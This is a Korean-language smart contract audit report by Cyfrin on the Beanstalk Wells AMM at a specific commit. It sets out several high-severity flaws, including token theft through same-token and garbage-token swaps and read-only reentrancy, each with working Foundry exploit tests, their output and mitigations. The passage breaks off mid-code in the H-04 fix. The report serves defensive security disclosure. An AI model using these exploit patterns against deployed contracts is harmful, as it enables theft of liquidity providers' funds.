---
title: Beanstalk Wells 초기 감사 보고서
author: Cyfrin.io
date: 2023년 3월 13일
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Beanstalk Wells 초기 감사 보고서\par}
    \vspace{1cm}
    {\Large 버전 0.1\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

# Beanstalk Wells 초기 감사 보고서

작성자: [Cyfrin](https://cyfrin.io)
수석 감사자: 

- [Giovanni Di Siena](https://twitter.com/giovannidisiena)

- [Hans](https://twitter.com/hansfriese)

보조 감사자:

- [Alex Roan](https://twitter.com/alexroan)

- [Patrick Collins](https://twitter.com/PatrickAlphaC)

# 목차
- [Beanstalk Wells 초기 감사 보고서](#beanstalk-wells-initial-audit-report)
- [목차](#table-of-contents)
- [면책 조항](#disclaimer)
- [감사 세부 정보](#audit-details)
  - [범위](#scope)
  - [중요도 기준](#severity-criteria)
  - [발견 사항 요약](#summary-of-findings)
- [상 (High)](#high)
  - [\[H-01\] 공격자가 토큰을 탈취하고 프로토콜의 불변성을 깨뜨릴 수 있음](#h-01-attackers-can-steal-tokens-and-break-the-protocols-invariant)
    - [설명](#description)
    - [개념 증명 (Proof of Concept)](#proof-of-concept)
    - [파급력](#impact)
    - [권장 완화 조치](#recommended-mitigation)
  - [\[H-02\] 공격자가 입력 토큰 검증 부족으로 인해 준비금(reserves)과 후속 유동성 예치금을 탈취할 수 있음](#h-02-attacker-can-steal-reserves-and-subsequent-liquidity-deposits-due-to-lack-of-input-token-validation)
    - [설명](#description-1)
    - [개념 증명 (Proof of Concept)](#proof-of-concept-1)
    - [파급력](#impact-1)
    - [권장 완화 조치](#recommended-mitigation-1)
  - [\[H-03\] `removeLiquidity` 로직이 ConstantProduct 외의 일반적인 Well 함수에 대해 올바르지 않음](#h-03-removeliquidity-logic-is-not-correct-for-general-well-functions-other-than-constantproduct)
    - [설명](#description-2)
    - [개념 증명 (Proof of Concept)](#proof-of-concept-2)
    - [파급력](#impact-2)
    - [권장 완화 조치](#recommended-mitigation-2)
  - [\[H-04\] 읽기 전용 재진입 (Read-only reentrancy)](#h-04-read-only-reentrancy)
    - [설명](#description-3)
    - [개념 증명 (Proof of Concept)](#proof-of-concept-3)
    - [파급력](#impact-3)
    - [권장 완화 조치](#recommended-mitigation-3)
- [중 (Medium)](#medium)
  - [\[M-01\] 전송 수수료가 있는(fee-on-transfer) ERC20 토큰에 대한 지원 부족](#m-01-insufficient-support-for-fee-on-transfer-erc20-tokens)
    - [설명](#description-4)
    - [파급력](#impact-4)
    - [권장 완화 조치](#recommended-mitigation-4)
  - [\[M-02\] 일부 토큰은 0 수량 전송 시 되돌리기(revert) 발생](#m-02-some-tokens-revert-on-transfer-of-zero-amount)
    - [설명](#description-5)
    - [파급력](#impact-5)
    - [권장 완화 조치](#recommended-mitigation-5)
  - [\[M-03\] ImmutableTokens에 대해 토큰이 고유한지 확인해야 함](#m-03-need-to-make-sure-the-tokens-are-unique-for-immutabletokens)
    - [설명](#description-6)
    - [파급력](#impact-6)
    - [권장 완화 조치](#recommended-mitigation-6)
- [하 (Low)](#low)
  - [\[L-01\] LibBytes의 잘못된 sload](#l-01-incorrect-sload-in-libbytes)
    - [설명](#description-7)
    - [개념 증명 (Proof of Concept)](#proof-of-concept-4)
    - [파급력](#impact-7)
    - [권장 완화 조치](#recommended-mitigation-7)
- [QA](#qa)
  - [\[NC-01\] 비표준 스토리지 패킹](#nc-01-non-standard-storage-packing)
  - [\[NC-02\] EIP-1967 두 번째 사전 이미지 모범 사례](#nc-02-eip-1967-second-pre-image-best-practice)
  - [\[NC-03\] 실험적인 ABIEncoderV2 pragma 제거](#nc-03-remove-experimental-abiencoderv2-pragma)
  - [\[NC-04\] 인라인 어셈블리에서 10진수/16진수 표기법의 일관성 없는 사용](#nc-04-inconsistent-use-of-decimalhex-notation-in-inline-assembly)
  - [\[NC-05\] 사용되지 않는 변수, import 및 오류](#nc-05-unused-variables-imports-and-errors)
  - [\[NC-06\] LibMath 주석의 불일치](#nc-06-inconsistency-in-libmath-comments)
  - [\[NC-07\] FIXME 및 TODO 주석](#nc-07-fixme-and-todo-comments)
  - [\[NC-08\] 올바른 NatSpec 태그 사용](#nc-08-use-correct-natspec-tags)
  - [\[NC-09\] 가독성을 위한 포맷팅](#nc-09-format-for-readability)
  - [\[NC-10\] 철자 오류](#nc-10-spelling-errors)
  - [\[G-1\] 모듈로 연산 단순화](#g-1-simplify-modulo-operations)
  - [\[G-2\] 분기 없는(Branchless) 최적화](#g-2-branchless-optimization)


# 면책 조항

Cyfrin 팀은 주어진 기간 동안 코드에서 가능한 많은 취약점을 찾기 위해 최선을 다하지만, 본 문서에서 제공된 발견 사항에 대해 어떠한 책임도 지지 않습니다. 팀에 의한 보안 감사는 기본 비즈니스 또는 제품에 대한 보증이 아닙니다. 감사는 2주라는 시간 제한 내에 진행되었으며, 코드 검토는 전적으로 스마트 계약의 solidity 구현 보안 측면에만 초점을 맞췄습니다.

# 감사 세부 정보

**이 문서에 기술된 발견 사항은 다음 커밋 해시와 관련이 있습니다:**
```
7c498215f843620cb24ec5bbf978c6495f6e5fe4
```
**Beanstalk Farms는 Cyfrin에 이것이 감사 대상 최종 커밋 해시가 아니라고 알렸습니다. 2023년 3월 10일, Beanstalk Farms는 Cyfrin에 새로운 커밋 해시를 제공했으며, 이에 대한 발견 사항은 별도의 감사 보고서에 기술될 예정입니다.**

## 범위 

2023년 2월 7일부터 2023년 2월 24일까지, Cyfrin 팀은 Beanstalk Farms의 [Wells](https://github.com/BeanstalkFarms/Wells) 저장소에 있는 스마트 계약에 대해 커밋 해시 `7c498215f843620cb24ec5bbf978c6495f6e5fe4`를 기준으로 감사를 수행했습니다.

## 중요도 기준

- 상 (High): 자산이 직접적으로 도난/분실/손상될 수 있는 경우 (또는 터무니없는 가정이 없는 유효한 공격 경로가 있는 경우 간접적으로).
- 중 (Medium): 자산이 직접적인 위험에 처하지는 않지만, 프로토콜의 기능이나 가용성에 영향을 미칠 수 있거나, 명시된 가정하에 가상의 공격 경로를 통해 가치가 유출될 수 있지만 외부 요구 사항이 있는 경우.
- 하 (Low): 낮은 파급력과 낮음/중간 가능성의 사건으로 자산이 위험에 처하지 않음 (또는 사소한 양의 자산만 해당), 상태 처리가 다소 벗어남, 함수가 natspec과 일치하지 않음, 주석 문제 등.
- QA / 비치명적 (Non-Critical): 보안 문제가 아닌 제안된 코드 개선, 주석, 변수 이름 변경 등. 감사자는 이러한 목록을 빠짐없이 찾으려고 시도하지 않았습니다.
- 가스 (Gas): 가스 절약 / 성능 제안. 감사자는 이러한 목록을 빠짐없이 찾으려고 시도하지 않았습니다.

## 발견 사항 요약

# 상 (High)

## [H-01] 공격자가 토큰을 탈취하고 프로토콜의 불변성을 깨뜨릴 수 있음

### 설명

프로토콜은 호출자가 `fromToken`을 `toToken`으로 교환할 수 있는 외부 함수 `Well::swapFrom()`을 노출합니다.
`Well::_getIJ()` 함수는 Well의 `tokens` 내에서 `fromToken`과 `toToken`의 인덱스를 가져오는 데 사용됩니다.
그러나 `Well::_getIJ` 함수는 올바르게 구현되지 않았습니다.

```solidity
Well.sol
566:     function _getIJ(//@audit returns (i, 0) if iToken==jToken while it should return (i, i)
567:         IERC20[] memory _tokens,
568:         IERC20 iToken,
569:         IERC20 jToken
570:     ) internal pure returns (uint i, uint j) {
571:         for (uint k; k < _tokens.length; ++k) {
572:             if (iToken == _tokens[k]) i = k;
573:             else if (jToken == _tokens[k]) j = k;
574:         }
575:     }
576:
```

`iToken==jToken`일 때, `_getIJ()`는 `(i, i)`를 반환해야 하지만 `(i, 0)`을 반환합니다.
`iToken==jToken`인 경우 토큰을 동일한 토큰으로 교환하는 것은 의미가 없으므로 되돌리기(revert)를 해야 합니다.
공격자는 이 취약점을 악용하여 토큰을 무료로 탈취하고 프로토콜의 핵심 불변성을 깨뜨릴 수 있습니다.

### 개념 증명 (Proof of Concept)

두 개의 토큰 `t0, t1`이 있는 Well이 `ConstantProduct2.sol`을 Well 함수로 사용하여 배포되었다고 가정합니다.

1. 프로토콜은 `(400 ether, 100 ether)` (`reserve0, reserve1`) 상태입니다.
2. 공격자 Alice가 `swapFrom(t1, t1, 100 ether, 0)`을 호출합니다.
3. [L148](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L148)에서 `(1, 0)`이 반환됩니다.
4. `amountOut`이 `200 ether`로 계산되고 풀의 실제 잔액은 스왑 후 `(400 ether, 0 ether)`인 반면, 풀의 준비금 상태는 `(200 ether, 200 ether)`가 됩니다.
5. Alice는 비용 없이 토큰 `t1`의 `100 ether`를 가져갔고, 풀의 저장된 준비금 값은 이제 실제 잔액보다 많습니다.

다음 코드 조각은 이 악용 시나리오를 보여주는 테스트 케이스입니다.

```solidity
    function test_exploitFromTokenEqualToToken_400_100_400() prank(user) public {
        uint[] memory well1Amounts = new uint[](2);
        well1Amounts[0] = 400 * 1e18;
        well1Amounts[1] = 100 * 1e18;
        uint256 lpAmountOut = well1.addLiquidity(well1Amounts, 400 * 1e18, address(this));
        emit log_named_uint("lpAmountOut", lpAmountOut);

        Balances memory userBalancesBefore = getBalances(user, well1);
        uint[] memory userBalances = new uint[](3);
        userBalances[0] = userBalancesBefore.tokens[0];
        userBalances[1] = userBalancesBefore.tokens[1];
        userBalances[2] = userBalancesBefore.lp;
        Balances memory wellBalancesBefore = getBalances(address(well1), well1);
        uint[] memory well1Balances = new uint[](3);
        well1Balances[0] = wellBalancesBefore.tokens[0];
        well1Balances[1] = wellBalancesBefore.tokens[1];
        well1Balances[2] = wellBalancesBefore.lpSupply;

        assertEq(lpAmountOut, well1Balances[2]);

        emit log_named_array("userBalancesBefore", userBalances);
        emit log_named_array("wellBalancesBefore", well1Balances);
        emit log_named_array("reservesBefore", well1.getReserves());

        vm.stopPrank();
        approveMaxTokens(user, address(well1));
        changePrank(user);

        uint256 swapAmountOut = well1.swapFrom(tokens[1], tokens[1], 100 * 1e18, 0, user);
        emit log_named_uint("swapAmountOut", swapAmountOut);

        Balances memory userBalancesAfter = getBalances(user, well1);
        userBalances[0] = userBalancesAfter.tokens[0];
        userBalances[1] = userBalancesAfter.tokens[1];
        userBalances[2] = userBalancesAfter.lp;
        Balances memory well1BalancesAfter = getBalances(address(well1), well1);
        well1Balances[0] = well1BalancesAfter.tokens[0];
        well1Balances[1] = well1BalancesAfter.tokens[1];
        well1Balances[2] = well1BalancesAfter.lpSupply;

        emit log_named_array("userBalancesAfter", userBalances);
        emit log_named_array("well1BalancesAfter", well1Balances);
        emit log_named_array("reservesAfter", well1.getReserves());

        assertEq(userBalances[0], userBalancesBefore.tokens[0]);
        assertEq(userBalances[1], userBalancesBefore.tokens[1] + swapAmountOut/2);
    }
```

출력 결과는 다음과 같습니다.

```
forge test -vv --match-test test_exploitFromTokenEqualToToken_400_100_400

[] Compiling...
No files changed, compilation skipped

Running 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_exploitFromTokenEqualToToken_400_100_400() (gas: 233054)
Logs:
  lpAmountOut: 400000000000000000000000000000
  userBalancesBefore: [600000000000000000000, 900000000000000000000, 0]
  wellBalancesBefore: [400000000000000000000, 100000000000000000000, 400000000000000000000000000000]
  reservesBefore: [400000000000000000000, 100000000000000000000]
  swapAmountOut: 200000000000000000000
  userBalancesAfter: [600000000000000000000, 1000000000000000000000, 0]
  well1BalancesAfter: [400000000000000000000, 0, 400000000000000000000000000000]
  reservesAfter: [200000000000000000000, 200000000000000000000]

Test result: ok. 1 passed; 0 failed; finished in 2.52ms
```

### 파급력

프로토콜은 일반화된 상수 함수 AMM(CFAMM)을 목표로 하며, 프로토콜의 핵심 불변성은 항상 실제 토큰 잔액보다 저장된 토큰(reserves)이 더 많거나 같아야 한다는 것입니다 (`모든 i에 대해 reserves[i] >= tokens[i].balanceOf(well)`).
`_getIJ()`의 잘못된 구현으로 인해 공격자는 이 불변성을 깨고 가치를 추출할 수 있습니다.
이 악용에는 추가적인 가정이 필요하지 않으므로 중요도를 **상(HIGH)**으로 평가합니다.

### 권장 완화 조치

- `Well::swapFrom()` 및 `Well::swapTo()` 함수에서 `fromToken==toToken`인 경우 되돌리기(revert)하는 온전성 검사(sanity check)를 추가하세요.
- `Well::_getIJ()` 함수에서 이 내부 함수가 동일한 토큰으로 사용되지 않는다고 가정하고 `iToken==jToken`인 경우 되돌리기하는 온전성 검사를 추가하세요.
- 모든 트랜잭션에서 Well이 충분한 준비금을 가지고 있는지 확인하기 위해 `Well::_executeSwap()` 함수에 검사를 추가하는 것을 강력히 권장합니다.
  이는 이상한(weird) ERC20 토큰, 특히 이중 진입점(double-entrypoint) 토큰을 Well 토큰으로 사용하는 것을 방지합니다.
  [이중 진입점](https://github.com/d-xo/weird-erc20#multiple-token-addresses) ERC20 토큰은 위에서 설명한 것과 유사한 문제를 일으킬 수 있습니다.

## [H-02] 공격자가 입력 토큰 검증 부족으로 인해 준비금(reserves)과 후속 유동성 예치금을 탈취할 수 있음

### 설명

프로토콜은 호출자가 `fromToken`을 `toToken`으로 교환할 수 있는 외부 함수 `Well::swapFrom()`을 노출합니다.
매개변수 `fromToken/toToken` 중 하나가 `_tokens`에 없으면, `_getIJ`에서 인덱스 `i/j`가 0으로 반환되는 유사한 문제가 발생합니다.
쓰레기(garbage) `fromToken`을 지정하여 `toToken`으로 교환하고 결과적으로 무료로 토큰을 받을 수 있는 것으로 보입니다.
준비금은 `업데이트`되지만 `_executeSwap`은 검증되지 않은 사용자 입력에 대해 전송을 수행하여, 쓰레기 토큰을 교환하지만 `_tokens[0]` 준비금을 업데이트합니다.
이는 `fromToken == toToken`인 H-01 사례와 유사하지만 별개의 취약점입니다.

### 개념 증명 (Proof of Concept)

다음은 이 악용 시나리오를 보여주는 테스트 케이스입니다.
공격자는 자신의 쓰레기 토큰을 배포하고 `Well::swapFrom(garbageToken, tokens[1])`을 호출하여 Well의 `tokens[0]` 잔액을 고갈시킬 수 있습니다.
유사한 악용이 `Well::swapTo()`에서도 가능하다는 점에 유의하세요.

```solidity
function test_exploitGarbageFromToken() prank(user) public {
    // this is the maximum that can be sent to the well before hitting ByteStorage: too large
    uint256 inAmount = type(uint128).max - tokens[0].balanceOf(address(well));

    IERC20 garbageToken = IERC20(new MockToken("GarbageToken", "GTKN", 18));
    MockToken(address(garbageToken)).mint(user, inAmount);

    address victim = makeAddr("victim");
    vm.stopPrank();
    approveMaxTokens(victim, address(well));
    mintTokens(victim, 1000 * 1e18);

    changePrank(user);
    garbageToken.approve(address(well), type(uint256).max);

    Balances memory userBalancesBefore = getBalances(user);
    uint[] memory userBalances = new uint[](3);
    userBalances[0] = userBalancesBefore.tokens[0];
    userBalances[1] = userBalancesBefore.tokens[1];
    userBalances[2] = userBalancesBefore.lp;
    Balances memory wellBalancesBefore = getBalances(address(well));
    uint[] memory wellBalances = new uint[](3);
    wellBalances[0] = wellBalancesBefore.tokens[0];
    wellBalances[1] = wellBalancesBefore.tokens[1];
    wellBalances[2] = wellBalancesBefore.lpSupply;

    emit log_named_array("userBalancesBefore", userBalances);
    emit log_named_array("wellBalancesBefore", wellBalances);
    emit log_named_array("reserves", well.getReserves());

    uint256 swapAmountOut = well.swapFrom(garbageToken, tokens[1], inAmount, 0, user);
    emit log_named_uint("swapAmountOut", swapAmountOut);

    Balances memory userBalancesAfter = getBalances(user);
    userBalances[0] = userBalancesAfter.tokens[0];
    userBalances[1] = userBalancesAfter.tokens[1];
    userBalances[2] = userBalancesAfter.lp;
    Balances memory wellBalancesAfter = getBalances(address(well));
    wellBalances[0] = wellBalancesAfter.tokens[0];
    wellBalances[1] = wellBalancesAfter.tokens[1];
    wellBalances[2] = wellBalancesAfter.lpSupply;

    emit log_named_array("userBalancesAfter", userBalances);
    emit log_named_array("wellBalancesAfter", wellBalances);
    emit log_named_array("reservesAfter", well.getReserves());

    assertEq(userBalances[0], userBalancesBefore.tokens[0]);
    assertEq(userBalances[1], userBalancesBefore.tokens[1] + swapAmountOut);
}
```

출력 결과는 다음과 같습니다.
프로토콜의 준비금 값은 변경되었지만 실제 잔액은 거의 0으로 고갈된 것을 확인할 수 있습니다.

```
forge test -vv --match-test test_exploitGarbageFromToken
[] Compiling...
No files changed, compilation skipped

Running 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_exploitGarbageFromToken() (gas: 1335961)
Logs:
  userBalancesBefore: [1000000000000000000000, 1000000000000000000000, 0]
  wellBalancesBefore: [1000000000000000000000, 1000000000000000000000, 2000000000000000000000000000000]
  reserves: [1000000000000000000000, 1000000000000000000000]
  swapAmountOut: 999999999999999997061
  userBalancesAfter: [1000000000000000000000, 1999999999999999997061, 0]
  wellBalancesAfter: [1000000000000000000000, 2939, 2000000000000000000000000000000]
  reservesAfter: [340282366920938463463374607431768211455, 2939]

Test result: ok. 1 passed; 0 failed; finished in 2.65ms
```

### 파급력

`swapFrom()`(및 `swapTo()`)의 입력 토큰에 대한 불충분한 온전성 검사로 인해 공격자가 토큰을 추출하고 프로토콜의 불변성을 깨뜨릴 수 있습니다.
이 악용에는 추가적인 가정이 필요하지 않으므로 중요도를 **상(HIGH)**으로 평가합니다.

### 권장 완화 조치

- `iToken` 또는 `jToken`이 `_tokens` 배열에 없는 경우 되돌리기하는 온전성 검사를 추가하세요.
- 또한 모든 트랜잭션에서 Well이 충분한 준비금을 가지고 있는지 확인하기 위해 `Well::_executeSwap()` 함수에 검사를 추가하는 것을 강력히 권장합니다.

## [H-03] `removeLiquidity` 로직이 ConstantProduct 외의 일반적인 Well 함수에 대해 올바르지 않음

### 설명

이 프로토콜은 다양한 Well 함수를 사용할 수 있는 일반화된 무허가(permission-less) CFAMM(상수 함수 AMM)을 목표로 합니다.

현재는 상수 곱(constant product) Well 함수 유형만 정의되어 있지만 더 일반적인 Well 함수에 대한 지원을 의도하고 있다고 가정합니다.

현재 `removeLiquidity()` 및 `getRemoveLiquidityOut()`의 구현은 Well 함수에 특별한 조건을 가정합니다.
LP 토큰 수량에서 출력 토큰 수량을 얻을 때 선형성(linearity)을 가정합니다.

이는 아래에서 볼 수 있듯이 상수 곱 Well 유형에는 잘 맞습니다.
LP 토큰의 총 공급량을 $L$, 두 토큰의 준비금 값을 $x, y$라고 하면 `ConstantProduct2`의 불변량은 $L^2=4xy$입니다.
$l$만큼의 유동성을 제거할 때 출력 금액은 $\Delta x=\frac{l}{L}x, \Delta y=\frac{l}{L}y$로 계산됩니다.
인출 후에도 불변량이 여전히 유지됨을 확인하는 것은 간단합니다. 즉, $(L-l)^2=(x-\Delta x)(y-\Delta y)$.

그러나 일반적으로 이러한 종류의 _선형성_은 유지된다고 보장할 수 없습니다.

최근에는 일부 새로운 프로토콜에 의해 비선형(2차) 함수 AMM이 도입되고 있습니다. (Numoen 참조 : https://numoen.gitbook.io/numoen/)
이러한 종류의 Well 함수를 사용하는 경우 현재의 `tokenAmountsOut` 계산은 Well의 불변성을 깨뜨릴 것입니다.

참고로 Numoen 프로토콜은 모든 트랜잭션 후 프로토콜의 불변성(상수 함수 자체)을 확인합니다.

### 개념 증명 (Proof of Concept)

Numoen에서 사용하는 2차 Well 함수로 테스트 케이스를 작성했습니다.

```solidity
// QuadraticWell.sol

/**
 * SPDX-License-Identifier: MIT
 **/

pragma solidity ^0.8.17;

import "src/interfaces/IWellFunction.sol";
import "src/libraries/LibMath.sol";

contract QuadraticWell is IWellFunction {
    using LibMath for uint;

    uint constant PRECISION = 1e18;//@audit-info assume 1:1 upperbound for this well
    uint constant PRICE_BOUND = 1e18;

    /// @dev s = b_0 - (p_1^2 - b_1/2)^2
    function calcLpTokenSupply(
        uint[] calldata reserves,
        bytes calldata
    ) external override pure returns (uint lpTokenSupply) {
        uint delta = PRICE_BOUND - reserves[1] / 2;
        lpTokenSupply = reserves[0] - delta*delta/PRECISION ;
    }

    /// @dev b_0 = s + (p_1^2 - b_1/2)^2
    /// @dev b_1 = (p_1^2 - (b_0 - s)^(1/2))*2
    function calcReserve(
        uint[] calldata reserves,
        uint j,
        uint lpTokenSupply,
        bytes calldata
    ) external override pure returns (uint reserve) {

        if(j == 0)
        {
            uint delta = PRICE_BOUND*PRICE_BOUND - PRECISION*reserves[1]/2;
            return lpTokenSupply + delta*delta /PRECISION/PRECISION/PRECISION;
        }
        else {
            uint delta = (reserves[0] - lpTokenSupply)*PRECISION;
            return (PRICE_BOUND*PRICE_BOUND - delta.sqrt()*PRECISION)*2/PRECISION;
        }
    }

    function name() external override pure returns (string memory) {
        return "QuadraticWell";
    }

    function symbol() external override pure returns (string memory) {
        return "QW";
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitQuadraticWellAddRemoveLiquidity() public {
    MockQuadraticWell quadraticWell = new MockQuadraticWell();
    Call memory _wellFunction = Call(address(quadraticWell), "");
    Well well2 = Well(auger.bore("Well2", "WELL2", tokens, _wellFunction, pumps));

    approveMaxTokens(user, address(well2));
    uint[] memory amounts = new uint[](tokens.length);
    changePrank(user);

    // initial status 1:1
    amounts[0] = 1e18;
    amounts[1] = 1e18;
    well2.addLiquidity(amounts, 0, user); // state: [1 ether, 1 ether, 0.75 ether]

    Balances memory userBalances1 = getBalances(user, well2);
    uint[] memory userBalances = new uint[](3);
    userBalances[0] = userBalances1.tokens[0];
    userBalances[1] = userBalances1.tokens[1];
    userBalances[2] = userBalances1.lp;
    Balances memory wellBalances1 = getBalances(address(well2), well2);
    uint[] memory wellBalances = new uint[](3);
    wellBalances[0] = wellBalances1.tokens[0];
    wellBalances[1] = wellBalances1.tokens[1];
    wellBalances[2] = wellBalances1.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances1", userBalances);
    emit log_named_array("wellBalances1", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts));

    // addLiquidity
    amounts[0] = 2e18;
    amounts[1] = 1e18;
    well2.addLiquidity(amounts, 0, user); // state: [3 ether, 2 ether, 3 ether]

    Balances memory userBalances2 = getBalances(user, well2);
    userBalances[0] = userBalances2.tokens[0];
    userBalances[1] = userBalances2.tokens[1];
    userBalances[2] = userBalances2.lp;
    Balances memory wellBalances2 = getBalances(address(well2), well2);
    wellBalances[0] = wellBalances2.tokens[0];
    wellBalances[1] = wellBalances2.tokens[1];
    wellBalances[2] = wellBalances2.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances2", userBalances);
    emit log_named_array("wellBalances2", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts));

    // removeLiquidity
    amounts[0] = 0;
    amounts[1] = 0;
    well2.removeLiquidity(userBalances[2], amounts, user);

    Balances memory userBalances3 = getBalances(user, well2);
    userBalances[0] = userBalances3.tokens[0];
    userBalances[1] = userBalances3.tokens[1];
    userBalances[2] = userBalances3.lp;
    Balances memory wellBalances3 = getBalances(address(well2), well2);
    wellBalances[0] = wellBalances3.tokens[0];
    wellBalances[1] = wellBalances3.tokens[1];
    wellBalances[2] = wellBalances3.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances3", userBalances);
    emit log_named_array("wellBalances3", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts)); // @audit-info well's invariant is broken via normal removeLiquidity
}
```

출력 결과는 다음과 같습니다.
트랜잭션 후 Well의 `invariant`를 계산했습니다.
0에 머물러야 하지만 유동성을 제거한 후 깨졌습니다.
유동성 추가 시에는 불변량이 0으로 유지되었는데, 이는 프로토콜이 Well 함수를 사용하여 결과 유동성 토큰 공급량을 명시적으로 계산하기 때문입니다.
그러나 유동성 제거 시에는 Well 함수를 사용하지 않고 고정된 방식으로 출력 금액을 계산하므로 불변량이 깨집니다.

```
forge test -vv --match-test test_exploitQuadraticWellAddRemoveLiquidity

[PASS] test_exploitQuadraticWellAddRemoveLiquidity() (gas: 4462244)
Logs:
  userBalances1: [999000000000000000000, 999000000000000000000, 750000000000000000]
  wellBalances1: [1000000000000000000, 1000000000000000000, 750000000000000000]
  invariant: 0
  userBalances2: [997000000000000000000, 998000000000000000000, 3000000000000000000]
  wellBalances2: [3000000000000000000, 2000000000000000000, 3000000000000000000]
  invariant: 0
  userBalances3: [1000000000000000000000, 1000000000000000000000, 0]
  wellBalances3: [0, 0, 0]
  invariant: 1000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 5.14ms
```

### 파급력

현재의 `removeLiquidity()` 로직은 Well 함수에 특정 조건(구체적으로 일종의 선형성)을 가정합니다.
이는 원래 목적과는 달리 프로토콜의 일반화를 제한합니다.
이는 일반적인 Well 함수의 유동성 제공자에게 자금 손실로 이어질 수 있으므로 중요도를 **상(HIGH)**으로 평가합니다.

### 권장 완화 조치

`IWellFunction` 인터페이스에 추가 함수를 추가하지 않고 모든 종류의 Well 함수를 커버하는 것은 불가능하다고 생각합니다.
`IWellFunction` 인터페이스에 `function calcWithdrawFromLp(uint lpTokenToBurn) returns (uint reserve)` 형식의 새로운 함수를 추가하는 것을 권장합니다.
출력 토큰 수량은 새로 추가된 함수를 사용하여 계산할 수 있습니다.

## [H-04] 읽기 전용 재진입 (Read-only reentrancy)

### 설명

현재 구현은 특히 [removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L296) 함수에서 읽기 전용 재진입에 취약합니다.
구현이 토큰을 보낸 후 새로운 준비금 값을 설정하므로 [CEI 패턴](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html)을 따르지 않습니다.
`nonReentrant` 수정자로 인해 프로토콜 자체에 직접적인 위험은 아니지만, 여전히 [읽기 전용 재진입](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/)에 취약합니다.

악의적인 공격자는 ERC777 토큰으로 Well을 배포하고 이 취약점을 악용할 수 있습니다.
Wells가 어떤 종류의 가격 함수로 확장될 경우 이는 치명적일 수 있습니다.
Wells를 통합하는 타사 프로토콜이 위험에 처할 것입니다.

### 개념 증명 (Proof of Concept)

아래는 기존의 읽기 전용 재진입을 보여주는 테스트 케이스입니다.

```solidity
// MockCallbackRecipient.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {console} from "forge-std/Test.sol";

contract MockCallbackRecipient {
    fallback() external payable {
        console.log("here");
        (bool success, bytes memory result) = msg.sender.call(abi.encodeWithSignature("getReserves()"));
        if (success) {
            uint256[] memory reserves = abi.decode(result, (uint256[]));
            console.log("read-only-reentrancy beforeTokenTransfer reserves[0]: %s", reserves[0]);
            console.log("read-only-reentrancy beforeTokenTransfer reserves[1]: %s", reserves[1]);
        }
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() public {
    IERC20 callbackToken = IERC20(new MockCallbackToken("CallbackToken", "CBTKN", 18));
    MockToken(address(callbackToken)).mint(user, 1000e18);
    IERC20[] memory _tokens = new IERC20[](2);
    _tokens[0] = callbackToken;
    _tokens[1] = tokens[1];

    vm.stopPrank();
    Well well2 = Well(auger.bore("Well2", "WELL2", _tokens, wellFunction, pumps));
    approveMaxTokens(user, address(well2));

    uint[] memory amounts = new uint[](2);
    amounts[0] = 100 * 1e18;
    amounts[1] = 100 * 1e18;

    changePrank(user);
    callbackToken.approve(address(well2), type(uint).max);
    uint256 lpAmountOut = well2.addLiquidity(amounts, 0, user);

    well2.removeLiquidity(lpAmountOut, amounts, user);
}
```

출력 결과는 다음과 같습니다.

```
forge test -vv --match-test test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken

[PASS] test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() (gas: 5290876)
Logs:
  read-only-reentrancy beforeTokenTransfer reserves[0]: 0
  read-only-reentrancy beforeTokenTransfer reserves[1]: 0
  read-only-reentrancy afterTokenTransfer reserves[0]: 0
  read-only-reentrancy afterTokenTransfer reserves[1]: 0
  read-only-reentrancy beforeTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy beforeTokenTransfer reserves[1]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[1]: 100000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 3.66ms
```

### 파급력

이것이 있는 그대로 프로토콜 자체에 대한 직접적인 위험은 아니지만, 미래에 치명적인 문제로 이어질 수 있습니다.
중요도를 **상(HIGH)**으로 평가합니다.

### 권장 완화 조치

관련 함수에 CEI 패턴을 구현하세요.
예를 들어 `Well::removeLiquidity` 함수는 다음과 같이 수정할 수 있습니다.

```solidity
function removeLiquidity(
    uint lpAmountIn,
    uint[] calldata minTokenAmountsOut,
    address recipient
) external nonReentrant returns (uint[] memory tokenAmountsOut) {
    IERC20[] memory _tokens = tokens();
    uint[] memory reserves = _updatePumps(_tokens.length);
    uint lpTokenSupply = totalSupply();

    tokenAmountsOut = new uint[](_tokens.length);
    _burn(msg.sender, lpAmountIn);

    _setReserves(reserves); // @audit CEI pattern

    for (uint i; i < _tokens.length; ++i) {
        tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;
        require(
            tokenAmountsOut[i] >= minTokenAmountsOut[i],
            "Well: slippage"
        );
        _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);
        reserves[i] = reserves[i] - tokenAmountsOut[i];
    }

